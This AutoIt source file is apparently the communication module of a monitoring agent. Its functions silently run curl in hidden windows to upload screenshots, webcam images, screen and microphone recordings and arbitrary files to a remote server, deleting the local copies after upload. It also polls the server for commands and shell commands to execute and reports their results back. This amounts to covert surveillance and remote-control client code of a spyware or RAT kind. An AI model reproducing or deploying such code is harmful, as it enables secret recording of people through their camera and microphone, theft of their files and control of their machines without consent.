
Func putError($computer_serial,$company_id,$module,$error)
	
    Local $address=$serverAddress&"/putError/computer_serial/"&$computer_serial&"/company_id/"&$company_id&"/module/"&$module&"/error/"&$error
	
	Local $parameter='curl -v '&$address
	
	Local $iPID = Run(@WorkingDir&'\lib\bin\curl\bin\curl.exe  '&$parameter, '', @SW_HIDE,BitOR($STDERR_CHILD, $STDOUT_CHILD))
	
	Local $sOutput = ""
	
	While 1
		
		$sOutput &= StdoutRead($iPID)
		
		If @error Then 
			
			ExitLoop
			
		EndIf
		
	WEnd
	
	ConsoleWrite($sOutput)
	
	Local $result=$sOutput
	
	if $result<>"ok" Then
		
		;there is a problem with the remote database lets store in the local one
		Local $result=putErrorLocal($computer_serial,$company_id,$module,$error)
		
		return $result
		
	EndIf
	
	
	if @error Then
		
		Return False
		
	EndIf
	
EndFunc



Func putComputer()
	
	Local $osArchitecture=@OSArch
	
	Local $cpuArchitecture=@CPUArch
	
	Local $osType=@OSType
	
	Local $computerName=$computer_user
	
	Local $address=$serverAddress&"/putComputer/computer_serial/"&$computer_serial&"/company_id/"&$company_id&"/cpuArch/"&$cpuArchitecture&"/osArch/"&$osArchitecture&"/osType/"&$osType&"/computer_name/"&$computerName
	
	Local $parameter='curl -v '&$address
	
	Local $iPID = Run(@WorkingDir&'\lib\bin\curl\bin\curl.exe  '&$parameter, '', @SW_HIDE,BitOR($STDERR_CHILD, $STDOUT_CHILD))
	
	Local $sOutput = ""
	
	While 1
		
		$sOutput &= StdoutRead($iPID)
		
		If @error Then 
			
			ExitLoop
			
		EndIf
		
	WEnd
	
	ConsoleWrite($sOutput)
	
	Local $result=$sOutput
	
	
	ConsoleWrite($result)
	
EndFunc


Func putScreenShot($computer_serial,$epoch,$filename,$filePath)
	
	Local $info=($computer_serial&","&$epoch&","&$filename)
	
	Local $address=$serverAddress&"/putScreenShot"
	
	Local $parameter='curl -v -F '& '"info='&$info&'"' & ' -F ' &  '"file=@'&$filePath&'" '&$address
	
	Local $iPID = Run(@WorkingDir&'\lib\bin\curl\bin\curl.exe  '&$parameter, '', @SW_HIDE,BitOR($STDERR_CHILD, $STDOUT_CHILD))
	
	Local $sOutput = ""
	
	While 1
		
		$sOutput &= StdoutRead($iPID)
		
		If @error Then 
			
			ExitLoop
			
		EndIf
		
	WEnd
	
	ConsoleWrite($sOutput)
	
	Local $result=$sOutput
	
	if $result<>"ok" Then
		
		;did not succeed storing online lets keep the record  in local db
		$result=PutScreenShotLocal($computer_serial,$epoch,$filename,$filePath)
		
		return $result
		
		
	Else 
		
		if FileExists($filePath) Then
		
			FileDelete ($filePath)
			
		EndIf
		
		Return  "ok"
		
		
	EndIf
		
		

EndFunc


Func putCameraShot($computer_serial,$epoch,$filename,$filePath)
	
	Local $info=($computer_serial&","&$epoch&","&$filename)
	
	Local $address=$serverAddress&"/putCameraShot"
	
	Local $parameter='curl -v -F '& '"info='&$info&'"' & ' -F ' &  '"file=@'&$filePath&'" '&$address
	
	
	Local $iPID = Run(@WorkingDir&'\lib\bin\curl\bin\curl.exe  '&$parameter, '', @SW_HIDE,BitOR($STDERR_CHILD, $STDOUT_CHILD))
	
	Local $sOutput = ""
	
	While 1
		
		$sOutput &= StdoutRead($iPID)
		
		If @error Then 
			
			ExitLoop
			
		EndIf
		
	WEnd
	
	ConsoleWrite($sOutput)
	
	Local $result=$sOutput
	
	if $result<>"ok"  Then
		
		;did not succeed storing online lets keep the record  in local db
		$result=PutCameraShotLocal($computer_serial,$epoch,$filename,$filePath)
		
		return $result
		
		
	Else 
		
		if FileExists($filePath) Then
		
			FileDelete ($filePath)
			
		EndIf
		
		Return  "ok"
		
		
	EndIf
		
EndFunc


Func putScreenRecording($computer_serial,$epoch,$filename,$filePath)
	
	Local $info=($computer_serial&","&$epoch&","&$filename)
	
	Local $address=$serverAddress&"/putScreenRecording"
	
	Local $parameter='curl -v -F '& '"info='&$info&'"' & ' -F ' &  '"file=@'&$filePath&'" '&$address
	
	
	Local $iPID = Run(@WorkingDir&'\lib\bin\curl\bin\curl.exe  '&$parameter, '', @SW_HIDE,BitOR($STDERR_CHILD, $STDOUT_CHILD))
	
	Local $sOutput = ""
	
	While 1
		
		$sOutput &= StdoutRead($iPID)
		
		If @error Then 
			
			ExitLoop
			
		EndIf
		
	WEnd
	
	ConsoleWrite($sOutput)
	
	Local $result=$sOutput
	
	if $result<>"ok"  Then
		
		;did not succeed storing online lets keep the record  in local db
		$result=PutScreenRecordingLocal($computer_serial,$epoch,$filename,$filePath)
		
		return $result
		
		
	Else 
		
		if FileExists($filePath) Then
		
			FileDelete ($filePath)
			
		EndIf
		
		Return  "ok"
		
		
	EndIf
		
EndFunc



Func putMicrophoneRecording($computer_serial,$epoch,$filename,$filePath)
	
	Local $info=($computer_serial&","&$epoch&","&$filename)
	
	Local $address=$serverAddress&"/putMicrophoneRecording"
	
	Local $parameter='curl -v -F '& '"info='&$info&'"' & ' -F ' &  '"file=@'&$filePath&'" '&$address
	
	
	Local $iPID = Run(@WorkingDir&'\lib\bin\curl\bin\curl.exe  '&$parameter, '', @SW_HIDE,BitOR($STDERR_CHILD, $STDOUT_CHILD))
	
	Local $sOutput = ""
	
	While 1
		
		$sOutput &= StdoutRead($iPID)
		
		If @error Then 
			
			ExitLoop
			
		EndIf
		
	WEnd
	
	ConsoleWrite($sOutput)
	
	Local $result=$sOutput
	
	if $result<>"ok"  Then
		
		;did not succeed storing online lets keep the record  in local db
		$result=PutMicrophoneRecordingLocal($computer_serial,$epoch,$filename,$filePath)
		
		return $result
		
		
	Else 
		
		if FileExists($filePath) Then
		
			FileDelete ($filePath)
			
		EndIf
		
		Return  "ok"
		
		
	EndIf
	
EndFunc


Func getCommands()
	
    Local $address=$serverAddress&"/getCommands/computer_serial/"&$computer_serial&"/company_id/"&$company_id
	
	Local $parameter='curl -v '&$address
	
	Local $iPID = Run(@WorkingDir&'\lib\bin\curl\bin\curl.exe  '&$parameter, '', @SW_HIDE,BitOR($STDERR_CHILD, $STDOUT_CHILD))
	
	Local $sOutput = ""
	
	While 1
		
		$sOutput &= StdoutRead($iPID)
		
		If @error Then 
			
			ExitLoop
			
		EndIf
		
	WEnd
	
	ConsoleWrite($sOutput)
	
	Local $result=$sOutput
	
	Return $result
	
EndFunc


Func putCommandStatus($commandId,$status)
	
    Local $address=$serverAddress&"/putCommandStatus/commandId/"&$commandId&"/status/"&$status
	
	Local $parameter='curl -v '&$address
	
	Local $iPID = Run(@WorkingDir&'\lib\bin\curl\bin\curl.exe  '&$parameter, '', @SW_HIDE,BitOR($STDERR_CHILD, $STDOUT_CHILD))
	
	Local $sOutput = ""
	
	While 1
		
		$sOutput &= StdoutRead($iPID)
		
		If @error Then 
			
			ExitLoop
			
		EndIf
		
	WEnd
	
	ConsoleWrite($sOutput)
	
	Local $result=$sOutput
	
	Return $result
	
EndFunc


Func putCommandFeedBack($commandId,$feedback)
	
    Local $address=$serverAddress&"/putCommandFeedBack"
	
	Local $parameter='curl -v -F '& '"id='&$commandId&'"' & ' -F ' &  '"feedback='&$feedback&'" '&$address
	
	Local $iPID = Run(@WorkingDir&'\lib\bin\curl\bin\curl.exe  '&$parameter, '', @SW_HIDE,BitOR($STDERR_CHILD, $STDOUT_CHILD))
	
	Local $sOutput = ""
	
	While 1
		
		$sOutput &= StdoutRead($iPID)
		
		If @error Then 
			
			ExitLoop
			
		EndIf
		
	WEnd
	
	ConsoleWrite($sOutput)
	
	Local $result=$sOutput
	
	Return $result
	
EndFunc


Func putFile($filePath)
	
	Local $address=$serverAddress&"/putFile"
	
	Local $parameter='curl -v -F '&  '"file=@'&$filePath&'" '&$address
	
	
	Local $iPID = Run(@WorkingDir&'\lib\bin\curl\bin\curl.exe  '&$parameter, '', @SW_HIDE,BitOR($STDERR_CHILD, $STDOUT_CHILD))
	
	Local $sOutput = ""
	
	While 1
		
		$sOutput &= StdoutRead($iPID)
		
		If @error Then 
			
			ExitLoop
			
		EndIf
		
	WEnd
	
	ConsoleWrite($sOutput)
	
	Local $result=$sOutput
	
	return $result
	
EndFunc


Func getShellCommands()
	
    Local $address=$serverAddress&"/getShellCommands/computer_serial/"&$computer_serial&"/company_id/"&$company_id
	
	Local $parameter='curl -v '&$address
	
	Local $iPID = Run(@WorkingDir&'\lib\bin\curl\bin\curl.exe  '&$parameter, '', @SW_HIDE,BitOR($STDERR_CHILD, $STDOUT_CHILD))
	
	Local $sOutput = ""
	
	While 1
		
		$sOutput &= StdoutRead($iPID)
		
		If @error Then 
			
			ExitLoop
			
		EndIf
		
	WEnd
	
	ConsoleWrite($sOutput)
	
	Local $result=$sOutput
	
	Return $result
	
EndFunc


Func putShellCommandStatus($commandId,$status)
	
    Local $address=$serverAddress&"/putShellCommandStatus/commandId/"&$commandId&"/status/"&$status
	
	Local $parameter='curl -v '&$address
	
	Local $iPID = Run(@WorkingDir&'\lib\bin\curl\bin\curl.exe  '&$parameter, '', @SW_HIDE,BitOR($STDERR_CHILD, $STDOUT_CHILD))
	
	Local $sOutput = ""
	
	While 1
		
		$sOutput &= StdoutRead($iPID)
		
		If @error Then 
			
			ExitLoop
			
		EndIf
		
	WEnd
	
	ConsoleWrite($sOutput)
	
	Local $result=$sOutput
	
	Return $result
	
EndFunc


Func putShellCommandFeedBack($commandId,$feedback)
	
    Local $address=$serverAddress&"/putShellCommandFeedBack"
	
	Local $parameter='curl -v -F '& '"id='&$commandId&'"' & ' -F ' &  '"feedback='&$feedback&'" '&$address
	
	Local $iPID = Run(@WorkingDir&'\lib\bin\curl\bin\curl.exe  '&$parameter, '', @SW_HIDE,BitOR($STDERR_CHILD, $STDOUT_CHILD))
	
	Local $sOutput = ""
	
	While 1
		
		$sOutput &= StdoutRead($iPID)
		
		If @error Then 
			
			ExitLoop
			
		EndIf
		
	WEnd
	
	ConsoleWrite($sOutput)
	
	Local $result=$sOutput
	
	Return $result
	
EndFunc
